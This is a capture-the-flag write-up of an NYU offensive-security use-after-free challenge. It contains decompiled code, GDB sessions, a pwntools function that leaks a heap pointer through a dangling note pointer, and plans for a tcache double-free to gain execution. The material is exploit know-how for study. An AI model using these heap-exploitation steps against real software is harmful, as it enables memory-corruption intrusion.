Location`nc offsec-chalbroker.osiris.cyber.nyu.edu 12347`
Flag: `flag{y0u_sur3_GOT_it_g00d!}`
Downloads: `share.zip`
Challenge Binary: `chal`
#### Checksec:
```
[*] '/home/jnu/Desktop/7-Week/uaf/challenge/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
# Disassembled Code
#### `main()`
```c
undefined8 main(EVP_PKEY_CTX *p1)
{
  int val;
  init(p1);
  while( true ) {
    while( true ) {
      while( true ) {
        while( true ) {
          menu();
          val = readint();
          if (val != 1) break;
          add();
        }
        if (val != 2) break;
        delete();
      }
      if (val != 3) break;
      edit();
    }
    if (val != 4) break;
    show();
  }
  return 0;
}
```
#### `menu()`
```c
void menu(void)

{
  puts("=========== NYU OFFSEC ============");
  puts("1.\tAdd a note");
  puts("2.\tDelete a note");
  puts("3.\tEdit a note");
  puts("4.\tRead a note");
  puts("5.\tExit");
  puts("=========== NYU OFFSEC ============");
  putchar(0x3e);
  return;
}
```
#### `readint()`
```c
void readint(void)

{
  long a;
  char str [24];
  long b;
  
  b = *(long *)(a + 0x28);
  read(0,str,0x10);
  atoi(str);
  if (b != *(long *)(a + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
#### `add()`
```c
void add(void)

{
  int val;
  ulong size;
  void *ptr;
  ulong n;
  
  for (n = 0; (n < 0x10 && (*(long *)(ptr_array + n * 8) != 0)); n = n + 1) {
  }
  puts("Size:");
  val = readint();
  size = (ulong)val;
  if ((size < 0x2000) && (ptr = malloc(size), ptr != (void *)0x0)) {
    *(void **)(ptr_array + n * 8) = ptr;
    *(ulong *)(size_array + n * 8) = size;
  }
  return;
}
```

Creates a note based of a user-specified size
* The first `for` loop finds the index of the first zero in `ptr_array` 
  (finds how far in the array we have to go before there is free space)
	* This value, `n`, is is the offset to write the new note pointer into
* Takes in the note size
* Checks to ensure that that memory can be freed
	* Only then does it save the pointer and size in their respective arrays
#### `delete()`
```c
void delete(void)
{
  int i;
  
  puts("which note do you wanna delete?");
  putchar(0x3e);
  i = readint();
  if ((ulong)(long)i < 0x10) {
    free(*(void **)(ptr_array + (long)i * 8));
  }
  return;
}
```

Releases the note at the entered index
It frees the memory, but does not set the pointer to NULL, so we could use this for a use after free
### `edit()`
```c
void edit(void)
{
  int i;
  ulong u;
  
  puts("which note do you wanna edit?");
  putchar(0x3e);
  i = readint();
  u = (ulong)i;
  if (u < 0x10) {
    puts("Content:");
    read(0,*(void **)(ptr_array + u * 8),*(size_t *)(size_array + u * 8));
  }
  return;
}
```

Save input data as the note's contents
Command is basically `read(0, $POINTER-TO-NOTE-IN-HEAP, NOTE-SIZE);`
	And that `read` takes in user input
#### `show()`
```c
void show(void)
{
  int i;
  ulong u;

  puts("which note do you wanna read?");
  putchar(0x3e);
  i = readint();
  u = (ulong)i;
  if (u < 0x10) {
    puts("Content:");
    write(1,*(void **)(ptr_array) + u * 8),*(size_t *)(size_array + u * 8));
  }
  return;
}
```

### Running it:
```
jnu@Offsec-Ubuntu-20:~/Desktop/7-Week/uaf/challenge$ ./chal 
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>1
Size:
32
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>3
which note do you wanna edit?
>0
Content:
AAAA
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>4
which note do you wanna read?
>0
Content:
AAAA
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>1
Size:
32
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>^Z
[2]+  Stopped                 ./chal
```
Yay, we can add notes and stuff

# Debuggery
###### Quick Note: Offset From Ghidra Values:
```
mainGhidra = 0x00101593
mainMemory = 0x00555555555593

	offset = mainMemory - mainGhidra
	offset = 0x00555555555593 -  0x00101593
	offset = 555555454000
```
## Adding and deleting note
##### Breakpoints before and after `malloc` and `free`
###### `add()`
* `malloc`: `0x00555555555378`
* Next line: `0x0055555555537d`
###### `delete()`
* `free`: `0x00555555555416`
* Next line: `0x0055555555541b`
###### Debugger Output
```
jnu@Offsec-Ubuntu-20:~/Desktop/7-Week/uaf/challenge$ gdb ./chal
gef➤  break main
Breakpoint 1 at 0x1593
gef➤  r
Starting program: /home/jnu/Desktop/7-Week/uaf/challenge/chal 
Breakpoint 1, 0x0000555555555593 in main ()
gef➤  disas add
Dump of assembler code for function add:
	...omitted for brevity...
	0x0000555555555375 <+107>:	mov    rdi,rax
	0x0000555555555378 <+110>:	call   0x555555555130 <malloc@plt>
	0x000055555555537d <+115>:	mov    QWORD PTR [rbp-0x8],rax
	...omitted for brevity...
gef➤  disas delete
Dump of assembler code for function delete:
	...omitted for brevity...
	0x0000555555555413 <+80>:	mov    rdi,rax
	0x0000555555555416 <+83>:	call   0x5555555550d0 <free@plt>
	0x000055555555541b <+88>:	nop
	0x000055555555541c <+89>:	leave 
	...omitted for brevity...
```
###### Setting breakpoints:
```
jnu@Offsec-Ubuntu-20:~/Desktop/7-Week/uaf/challenge$ gdb ./chal -q
gef➤  break *0x00555555555378
Breakpoint 1 at 0x555555555378
gef➤  break *0x0055555555537d
Breakpoint 2 at 0x55555555537d
gef➤  break *0x00555555555416
Breakpoint 3 at 0x555555555416
gef➤  break *0x0055555555541b
Breakpoint 4 at 0x55555555541b
```
### Running
#### Add
```
gef➤  r
Starting program: /home/jnu/Desktop/7-Week/uaf/challenge/chal 
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>1
Size:
32

Breakpoint 1, 0x0000555555555378 in add ()
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x00007ffff7dc4000 0x00007ffff7de6000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de6000 0x00007ffff7f5e000 0x0000000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5e000 0x00007ffff7fac000 0x000000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fac000 0x00007ffff7fb0000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb0000 0x00007ffff7fb2000 0x00000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw- 
0x00007ffff7fc9000 0x00007ffff7fcd000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcd000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

gef➤  c
Continuing.

Breakpoint 2, 0x000055555555537d in add ()
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dc4000 0x00007ffff7de6000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de6000 0x00007ffff7f5e000 0x0000000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5e000 0x00007ffff7fac000 0x000000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fac000 0x00007ffff7fb0000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb0000 0x00007ffff7fb2000 0x00000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw- 
0x00007ffff7fc9000 0x00007ffff7fcd000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcd000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```

And now we have our heap!
###### Gonna edit this note real quick 
```
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>3
which note do you wanna edit?
>0
Content:
aaaa
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>4
which note do you wanna read?
>0
Content:
aaaa
```
Now she has data
#### deleting
###### Finding `ptr_array` address: `0x00555555558060`
```
offset = mainMemory - mainGhidra
offset = 0x00555555454000
Ghidra(ptr_array) = 0x00104060
	
	GDB(ptr_array) = Ghidra(ptr_array) + offset
	GDB(ptr_array) = 0x00104060 + 0x00555555454000
	GDB(ptr_array) = 555555558060
```
##### Before `free`:
Output:
```
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>2
which note do you wanna delete?
>0

Breakpoint 3, 0x0000555555555416 in delete ()
registers ────
$rax   : 0x00005555555592a0  →  0x0000000a61616161 ("aaaa\n"?)
$rbx   : 0x0000555555555610  →  <__libc_csu_init+0> endbr64 
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffdf80  →  0x00007fffffffe0a0  →  0x0000000000000001
$rbp   : 0x00007fffffffdf90  →  0x00007fffffffdfb0  →  0x0000000000000000
$rsi   : 0xffffffda        
$rdi   : 0x00005555555592a0  →  0x0000000a61616161 ("aaaa\n"?)
$rip   : 0x0000555555555416  →  <delete+83> call 0x5555555550d0 <free@plt>

gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/jnu/Desktop/7-Week/uaf/challenge/chal
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dc4000 0x00007ffff7de6000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de6000 0x00007ffff7f5e000 0x0000000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5e000 0x00007ffff7fac000 0x000000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fac000 0x00007ffff7fb0000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb0000 0x00007ffff7fb2000 0x00000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw- 
0x00007ffff7fc9000 0x00007ffff7fcd000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcd000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

gef➤  p/x *0x00555555558060
$2 = 0x555592a0
gef➤  x/2x 0x00555555558060
0x555555558060 <array>:	0x555592a0	0x00005555
gef➤  x/4x 0x005555555592a0
0x5555555592a0:	0x61616161	0x0000000a	0x00000000	0x00000000
```

`RDI` has `0x00005555555592a0`, which is the pointer to our data in the heap
```
$rdi   : 0x00005555555592a0  →  0x0000000a61616161 ("aaaa\n"?)

gef➤  x/4x 0x005555555592a0
0x5555555592a0:	0x61616161	0x0000000a	0x00000000	0x00000000
```
That same value is also stored at `array[0]` (because this is `note 0`)
```
gef➤  x/2x 0x00555555558060
0x555555558060 <array>:	0x555592a0	0x00005555
```

The address, `0x005555555592a0`, is within the range of our heap
```
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
```

Continuing...
##### After `free`:
Output:
```
Breakpoint 4, 0x000055555555541b in delete ()
registers ────
$rax   : 0x0               
$rbx   : 0x0000555555555610  →  <__libc_csu_init+0> endbr64 
$rcx   : 0x1               
$rdx   : 0x0               
$rsp   : 0x00007fffffffdf80  →  0x00007fffffffe0a0  →  0x0000000000000001
$rbp   : 0x00007fffffffdf90  →  0x00007fffffffdfb0  →  0x0000000000000000
$rsi   : 0x00005555555592a0  →  0x0000000000000000
$rdi   : 0x0000555555559012  →  0x0000000000000001
$rip   : 0x000055555555541b  →  <delete+88> nop 

gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]

gef➤  x/2x 0x00555555558060
0x555555558060 <array>:	0x555592a0	0x00005555
gef➤  x/4x 0x005555555592a0
0x5555555592a0:	0x00000000	0x00000000	0x55559010	0x00005555

gef➤  c
Continuing.
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
```

So the heap is still there:
```
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
```
The array still holds a pointer to the data:
```
gef➤  x/2x 0x00555555558060
0x555555558060 <array>:	0x555592a0	0x00005555
```
But our data has been overwritten..?
```
gef➤  x/4x 0x005555555592a0
0x5555555592a0:	0x00000000	0x00000000	0x55559010	0x00005555
```

### Playing with delete and edit
###### We can still use the pointers after free:
```
jnu@Offsec-Ubuntu-20:~/Desktop/7-Week/uaf/challenge$ ./chal
=========== NYU OFFSEC ============
1.	Add a note
2.	Delete a note
3.	Edit a note
4.	Read a note
5.	Exit
=========== NYU OFFSEC ============
>1
Size:
64
>3
which note do you wanna edit?
>0
Content:
aaaa

>1
Size:
64
>3
which note do you wanna edit?
>1
Content:
bbbb

>4
which note do you wanna read?
>0
Content:
aaaa
>4
which note do you wanna read?
>1
Content:
bbbb

>2
which note do you wanna delete?
>0 

>4
which note do you wanna read?
>0
Content:
�΄�U

>3
which note do you wanna edit?
>0
Content:
cccc
>4
which note do you wanna read?
>0
Content:
cccc

>1
Size:
64
>4
which note do you wanna read?
>2
Content:
cccc

>3
which note do you wanna edit?
>2
Content:
dddd
>4
which note do you wanna read?
>2
Content:
dddd
>4
which note do you wanna read?
>0
Content:
dddd

which note do you wanna edit?
>0
Content:
eeee
>4
which note do you wanna read?
>2
Content:
eeee
>4
which note do you wanna read?
>0
Content:
eeee
```

So, we can indeed see that the pointer in `0` still works even though `note 0` was deleted



# Leaking The Heap
###### Steps
1) Allocate two things
	In this case, make two `notes`
2) Set them free
	call `delete` on both `notes`
3) Print `note0`?

It feels like it should be harder than that...
## Getting 0's
###### Code:
```python
def leakHeap(p):
	p.recvuntil(">")
	p.clean(timeout=0.05)
	
	# First Allocation
	data = str("AAAA")
	addNote(p, 8)
	editNote(p, 0, data)
	p.recvuntil(">")
	p.clean(timeout=0.05)

	# Second Allocation
	data = str("BBBB")
	addNote(p, 8)
	editNote(p, 1, data)
	p.recvuntil(">")
	p.clean(timeout=0.05)

	# Now set them free
	deleteNote(p, 0)
	p.recvuntil(">")
	deleteNote(p, 1)
	p.recvuntil(">")
	p.clean(timeout=0.05)

	# Print note 0
	readNote(p, 0)

	l = p.recvline()
	#print(l)
	return cleanLine(l)
```
###### Results:
```
jnu@Offsec-Ubuntu-20:~/Desktop/7-Week/uaf$ python3 UAF_Pwn1.py 
[+] Starting local process '/home/jnu/Desktop/7-Week/uaf/challenge/chal': pid 82355
\x00\x00\x00\x00\x00\x00\x00\x00=========== NYU OFFSEC ============
```

That is what I saw in the heap last time too...

## Break in `show()`

Array can always be calculated
1st line of main - mainGhidra + arrayGhidra

56288EAA4000 + 00104060 = 56288E99FFA0

```
jnu@Offsec-Ubuntu-20:~/Desktop/7-Week/uaf$ python3 UAF_Pwn1.py
0x0000564f79636593
0x564f79639060
[#0] Id 1, Name: "chal", stopped 0x564f796364a6 in show (), reason: BREAKPOINT

gef➤  $ x/2x 0x564f79639060
0x564f79639060 <array>:    0x7b4082a0    0x0000564f


```


# Okay, I think we're finally getting somewhere
We can leak an address in heap now!
```
jnu@Offsec-Ubuntu-20:~/Desktop/7-Week/uaf$ python3 UAF_Pwn3.py 
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 12347: Done
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x2 bytes:
    b'\n'
    b'>'
[DEBUG] Received 0xa7 bytes:
    00000000  43 6f 6e 74  65 6e 74 3a  0a 00 00 00  00 00 00 00  │Cont│ent:│····│····│
    00000010  00 10 10 fc  74 02 56 00  00 3d 3d 3d  3d 3d 3d 3d  │····│t·V·│·===│====│
    00000020  3d 3d 3d 3d  20 4e 59 55  20 4f 46 46  53 45 43 20  │====│ NYU│ OFF│SEC │
    00000030  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  0a 31 2e 09  │====│====│====│·1.·│
    00000040  41 64 64 20  61 20 6e 6f  74 65 0a 32  2e 09 44 65  │Add │a no│te·2│.·De│
    00000050  6c 65 74 65  20 61 20 6e  6f 74 65 0a  33 2e 09 45  │lete│ a n│ote·│3.·E│
    00000060  64 69 74 20  61 20 6e 6f  74 65 0a 34  2e 09 52 65  │dit │a no│te·4│.·Re│
    00000070  61 64 20 61  20 6e 6f 74  65 0a 35 2e  09 45 78 69  │ad a│ not│e·5.│·Exi│
    00000080  74 0a 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 20 4e 59  │t·==│====│====│= NY│
    00000090  55 20 4f 46  46 53 45 43  20 3d 3d 3d  3d 3d 3d 3d  │U OF│FSEC│ ===│====│
    000000a0  3d 3d 3d 3d  3d 0a 3e                               │====│=·>│
    000000a7
b'\x10\x10\xfct\x02V\x00\x00'
1010fc7402560000
0x560274fc1010
[*] Switching to interactive mode
=========== NYU OFFSEC ============
1.    Add a note
2.    Delete a note
3.    Edit a note
4.    Read a note
5.    Exit
=========== NYU OFFSEC ============
>$  
[38]+  Stopped                 python3 UAF_Pwn3.py

```

Working file is `UAF_Pwn3.py`


# Next Steps
1) Leak Heap
	1) Calculate heap offset
2) Leak glibc
	1) Calculate offset
3) Execution

Execution?
Gonna see if double free will do that for me...
Set up and delete two
Make a new note
Put address in that note
Delete old note?









0x000055555555541e



0x005555555553c3



I think double free should ultimately let me control where the next allocation goes....so maybe I can write to an executable area?....or to the stop of the stack!

I have to fill tcache first I think

1) Fill Tcache
	Create 8 notes of size 8
	Delete them
2) Create three more allocations
	Fre the first, free the second, then free the first again
